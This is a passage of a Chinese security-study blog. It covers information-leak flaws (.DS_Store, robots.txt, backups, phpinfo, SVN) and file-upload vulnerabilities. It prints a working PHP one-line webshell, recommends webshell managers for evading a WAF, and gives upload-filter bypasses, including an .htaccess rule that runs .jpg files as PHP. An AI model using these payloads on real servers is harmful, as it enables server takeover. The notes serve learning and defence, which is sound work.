<h4 id="3、DS-Store源码泄露漏洞"><a href="#3、DS-Store源码泄露漏洞" class="headerlink" title="3、DS_Store源码泄露漏洞"></a>3、DS_Store源码泄露漏洞</h4><p><strong>漏洞描述：</strong>在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store" target="_blank" rel="noopener">http://www.xxx.com/.ds_store</a></p>
<p><strong>检测方式：</strong>dsstoreexp,使用方式：<code>python ds_store_exp.py http://域名/.Ds.store</code></p>
<h4 id="4、robots导致文件泄露"><a href="#4、robots导致文件泄露" class="headerlink" title="4、robots导致文件泄露"></a>4、robots导致文件泄露</h4><p><strong>漏洞描述：</strong>搜索引擎可以通过robots文件获知哪些页面可以爬取，哪些页面不可以爬取。Robots协议是网站国际互联网通行的道德规范。其目的是保护网站数据和明杆信息 、确保用户个人信息和隐私不被侵犯，如果robots.txt文件太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p>
<p><strong>检测方式：</strong>1.我们可以直接使用御剑进行后台扫描，或者直接用爬虫进行爬取，从而找到robots.txt文件。</p>
<p>​                   2.直接在网站URL输入/robots.txt进行查看。</p>
<p><strong>修复方案：</strong>为了不让robots.txt中的内容不泄露网站的后台和隐私，我们可以使用星号（*）作为通配符进行设置。例如限制访问我们的后台admin目录，则规则为：</p>
<p>​       <img src="QQ截图20200119110404.png" style="zoom: 80%;" /></p>
<p>​             当我们又不想泄露我们的敏感目录时，我们可以使用星号(*)作为通配符即可。</p>
<img src="QQ截图20200119110727.png" style="zoom:80%;" />

<p>​                 </p>
<h4 id="5、备份文件泄露漏洞"><a href="#5、备份文件泄露漏洞" class="headerlink" title="5、备份文件泄露漏洞"></a>5、备份文件泄露漏洞</h4><p><strong>漏洞描述：</strong>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf    bakup.tgz</code>的命令将网站进行备份,<br> 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br> 如vim的<code>.swp</code>, 从而泄露了该网页的源代码。<br><strong>检测方式：</strong>常见的备份文件后缀名：直接在URL中进行检测。</p>
<pre><code>*.rar    *.zip   *.7z   *.tar.gz   *.bak   *.swp   *.txt   *.html</code></pre><p>​                   或者使用工具比如AWVS进行扫描。</p>
<p><strong>修复方案：</strong>做好版本管理, 并利用版本管理工具过滤掉这些类型的文件, 同时不要直接在生产环境中修改或者添加文件</p>
<h4 id="6、phpinfo-）信息泄露漏洞"><a href="#6、phpinfo-）信息泄露漏洞" class="headerlink" title="6、phpinfo(）信息泄露漏洞"></a>6、phpinfo(）信息泄露漏洞</h4><p><strong>漏洞描述</strong>：Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息。</p>
<img src="sec_hole_13.png" style="zoom:67%;" />

<p><strong>检测方式 ：</strong>访问<a href="http://ip/phpinfo.php看是否成功。" target="_blank" rel="noopener">http://ip/phpinfo.php看是否成功。</a></p>
<p><strong>修复方案 ：</strong>删除该PHP文件。</p>
<h4 id="7、SVN文件泄露漏洞"><a href="#7、SVN文件泄露漏洞" class="headerlink" title="7、SVN文件泄露漏洞"></a>7、SVN文件泄露漏洞</h4><p><strong>漏洞描述：</strong>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p><strong>漏洞检测：</strong> </p>
<p>1.漏洞利用工具： Seay SVN漏洞利用工具</p>
<p>2、添加网站url</p>
<p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p>
<p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p>
<p>m’g</p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p>
<p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
<p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>敏感信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞学习</title>
    <url>/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/</url>
    <content><![CDATA[<h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
<p><strong>关于PHP中$_FILES数组的使用方法</strong></p>
<pre><code>$_FILES\[‘file’][‘name’] 客户端文件名称

$_FILES\[‘file’][‘type’] 文件的MIME类型

$_FILES\[‘file’][‘size’] 文件大小 单位字节

$_FILES\[‘file’][‘tmp_name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</code></pre><p>需要注意的是在文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者<code>move_uploaded_file</code>两个函数</p>
<h5 id="文件上传中常见的函数错误"><a href="#文件上传中常见的函数错误" class="headerlink" title="文件上传中常见的函数错误"></a>文件上传中常见的函数错误</h5><p><strong>这些函数有:<code>empty()、isset()、strpos()、rename()</code>等，如下面的代码:</strong></p>
<pre><code>#!php
if($operateId == 1){
    $date = date(&quot;Ymd&quot;);
    $dest = $CONFIG-&gt;basePath.&quot;data/files/&quot;.$date.&quot;/&quot;;
    $COMMON-&gt;createDir($dest);
    //if (!is_dir($dest))   mkdir($dest, 0777);
    $nameExt = strtolower($COMMON-&gt;getFileExtName($_FILES[&#39;Filedata&#39;][&#39;name&#39;]));
    $allowedType = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;bmp&#39;, &#39;png&#39;, &#39;jpeg&#39;);
    if(!in_array($nameExt, $allowedType)){
        $msg = 0;
    }
    if(empty($msg)){
        $filename = getmicrotime().&#39;.&#39;.$nameExt;
        $file_url = urlencode($CONFIG-&gt;baseUrl.&#39;data/files/&#39;.$date.&quot;/&quot;.$filename);
        $filename = $dest.$filename;
        if(empty($_FILES[&#39;Filedata&#39;][&#39;error&#39;])){
            move_uploaded_file($_FILES[&#39;Filedata&#39;][&#39;tmp_name&#39;],$filename);
        }
        if (file_exists($filename)){
            //$msg = 1;
            $msg = $file_url;
            @chmod($filename, 0444);
        }else{
            $msg = 0;
        }
    }
    $outMsg = &quot;fileUrl=&quot;.$msg;
    $_SESSION[&quot;eoutmsg&quot;] = $outMsg;
    exit;
}</code></pre><h4 id="文件上传漏洞的利用"><a href="#文件上传漏洞的利用" class="headerlink" title="文件上传漏洞的利用"></a>文件上传漏洞的利用</h4><p>​        这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p>
<ul>
<li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；</li>
<li>上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；</li>
<li>上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；</li>
<li>上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；</li>
<li>上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。</li>
</ul>
<h5 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h5><p>Webshell:大马、小马</p>
<ul>
<li>大马：代码量多，功能多</li>
<li>小马：代码量少，功能也少</li>
</ul>
<p>例如：一句话木马<?php eval($_POST[‘a’]); ?>    单引号可不加，只能接受php代码</p>
<p><strong>菜刀种类</strong></p>
<ul>
<li>中国菜刀：基本都有后门，强烈不推荐使用</li>
<li>cknife（C刀）：一般</li>
<li>蚁剑：js开发，中国菜刀js版，推荐使用，github有</li>
<li>冰蝎：自带加密，木马没有特征，极力推荐使用，github有</li>
<li>k8飞刀：推荐使用，工具多</li>
</ul>
<p>什么时候用大马？什么时候用小马？什么时候用过狗马？</p>
<ul>
<li>过狗小马：冰蝎小马</li>
<li>过狗大马：过狗大马</li>
<li>遇到安全狗，直接上大马，不考虑小马，原因：菜刀流量特征明显，而大马是正常文件正常访问。小马才需要菜刀连接，大马不需要。</li>
</ul>
<h4 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h4><p>条件竞争漏洞,</p>
<p>接着看下面这段代码(摘自某VPN系统)</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#!php</span>
<span class="token delimiter">&lt;?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">mb_convert_encoding</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"GBK"</span><span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Pragma:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Length:"</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition:attachment;filename=\"$file\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>上述代码的逻辑表面上看起来是这样的(对于攻击者来说)：</p>
<p>利用copy函数，将realfile生成shell.php-→删除掉shell.php</p>
<p>这样初看起来没办法利用，但是仔细一想, 这段代码其实是存在逻辑问题的，所以我们可以利用这个逻辑缺陷达到GetShell的目的。</p>
<p>具体利用方法：</p>
<p>copy成temp.php–&gt;不断访问temp.php-&gt;temp.php生成shell.php-&gt;删除temp.php</p>
<h4 id="校验方式分类-amp-总结"><a href="#校验方式分类-amp-总结" class="headerlink" title="校验方式分类&amp;总结"></a>校验方式分类&amp;总结</h4><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验</li>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h4 id="校验方式溯源"><a href="#校验方式溯源" class="headerlink" title="校验方式溯源"></a>校验方式溯源</h4><p>​    通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s" alt="img"></p>
<h4 id="校验方式-amp-绕过姿势"><a href="#校验方式-amp-绕过姿势" class="headerlink" title="校验方式&amp;绕过姿势"></a>校验方式&amp;绕过姿势</h4><h5 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h5><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。当WebDAV开启PUT，MOVE，COPY，DELETE方法时，攻击者就可以向服务器上传危险脚本文件。</p>
<p>此时可以使用OPTIONS探测服务器支持的http方法，如果支持PUT，就进行上传脚本文件，在通过MOVE或COPY方法改名。当开启DELETE时还可以删除文件。</p>
<p>参考:<a href="http://wiki.wooyun.org/server:httpput" target="_blank" rel="noopener">http://wiki.wooyun.org/server:httpput</a></p>
<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><h5 id="JavaScript校验"><a href="#JavaScript校验" class="headerlink" title="JavaScript校验"></a>JavaScript校验</h5><p>验证代码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token comment" spellcheck="true">//文件上传漏洞演示脚本之js验证</span>
$uploaddir <span class="token operator">=</span> <span class="token string">'uploads/'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$uploaddir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $uploaddir <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            echo <span class="token string">'文件上传成功，保存于：'</span> <span class="token punctuation">.</span> $uploaddir <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>$uploaddir <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//print_r($_FILES);</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
    <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>head<span class="token operator">></span>
    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=gbk"</span><span class="token operator">/</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"content-language"</span> content<span class="token operator">=</span><span class="token string">"zh-CN"</span><span class="token operator">/</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>title<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>
    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
       <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upfile'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你还没有选择任何文件，不能上传!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>
            <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.jpeg|.png|.gif|.bmp|"</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//提取上传文件的类型</span>
            <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//alert(ext_name);</span>
            <span class="token comment" spellcheck="true">//alert(ext_name + "|");</span>
            <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span>     ext_name<span class="token punctuation">;</span>
                <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span>h3<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>
<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">""</span> method<span class="token operator">=</span><span class="token string">"post"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span> name<span class="token operator">=</span><span class="token string">"upload"</span> onsubmit<span class="token operator">=</span><span class="token string">"return     checkFile()"</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"MAX_FILE_SIZE"</span> value<span class="token operator">=</span><span class="token string">"204800"</span><span class="token operator">/</span><span class="token operator">></span>
    请选择要上传的文件：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token operator">/</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> name<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"上传"</span><span class="token operator">/</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre>
<p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p>
<h5 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h5><p>1.通过firefox的F12修改js代码绕过验证 2.使用burp抓包直接提交，绕过js验证</p>
<h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><h5 id="文件头content-type字段校验（服务端MIME类型检测）"><a href="#文件头content-type字段校验（服务端MIME类型检测）" class="headerlink" title="文件头content-type字段校验（服务端MIME类型检测）"></a>文件头content-type字段校验（服务端MIME类型检测）</h5><h5 id="MIME类型介绍"><a href="#MIME类型介绍" class="headerlink" title="MIME类型介绍"></a>MIME类型介绍</h5><p><strong>MIME type</strong>的缩写为<strong>(Multipurpose Internet Mail Extensions)</strong>代表互联网媒体类型(Internet media type)，MIME使用一个简单的字符串组成，最初是为了标识邮件Email附件的类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。</p>
<p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。</p>
<p>Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p>
<h6 id="MIME类型格式："><a href="#MIME类型格式：" class="headerlink" title="MIME类型格式："></a>MIME类型格式：</h6><p>类别/子类别;参数 Content-Type: [type]/[subtype]; parameter</p>
<h6 id="MIME主类别："><a href="#MIME主类别：" class="headerlink" title="MIME主类别："></a>MIME主类别：</h6><p>text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；</p>
<p>Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</p>
<p>Application：用于传输应用程序数据或者二进制数据；</p>
<p>Message：用于包装一个E-mail消息；</p>
<p>Image：用于传输静态图片数据；</p>
<p>Audio：用于传输音频或者音声数据；</p>
<p>Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</p>
<h6 id="常见MIME类型："><a href="#常见MIME类型：" class="headerlink" title="常见MIME类型："></a>常见MIME类型：</h6><p><img src="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s" alt="img"></p>
<h5 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//检测content-type</span>
    <span class="token keyword">echo</span> <span class="token string">"sorry,we only allow uploading GIF images"</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Upload success!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p>
<h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p>
<h4 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h4><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//判断上传文件类型</span>
<span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token function">fileext</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fileext</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"upload success!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"sorry"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>默认上传后的文件保存的名字是已获取到的名字</p>
<h5 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h5><h6 id="配合Apache的-htaccess文件上传解析漏洞"><a href="#配合Apache的-htaccess文件上传解析漏洞" class="headerlink" title="配合Apache的.htaccess文件上传解析漏洞"></a>配合Apache的.htaccess文件上传解析漏洞</h6><blockquote>
<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p>
</blockquote>
<p>有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。</p>
<p>首先我们编写一个.htaccess文件。打开记事本，编写代码“AddType application/x-httpd-php .jpg”，然后点击文件选中另存为，编写文件名为.htaccess，选择保存类型为所有文件。然后将其进行上传。因为.htaccess是apache服务器中的一个配置文件,不在上传的文件的黑名单之内,所以.htaccess文件是可以上传成功。</p>
<p>接下来我们制造一个一句话木马文件，如取名为yijuhua.php。因为之前上传成功到服务器的.htaccess文件里的代码可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们把yijuhua.php文件的后缀名改为.jpg格式,让.htaccess文件解析yijuhua.jpg文件里的php代码，从而使木马上传成功并达到可执行的目的。</p>
